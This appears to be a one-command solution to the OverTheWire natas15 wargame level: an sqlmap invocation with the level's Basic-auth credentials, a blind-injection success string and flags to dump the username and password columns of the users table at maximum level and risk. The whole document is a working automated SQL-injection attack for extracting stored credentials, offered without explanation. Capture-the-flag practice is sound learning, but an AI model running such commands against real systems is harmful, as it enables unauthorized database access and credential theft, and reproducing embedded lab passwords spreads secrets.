sqlmap -v 2 -u http://natas15.natas.labs.overthewire.org/index.php?debug \
--auth-type Basic --auth-cred natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \
--string "This user exists" \
--dbms mysql -D natas15 -T users -C username,password \
--data "username=natas16" \
--level 5 --risk 3 \
--dump
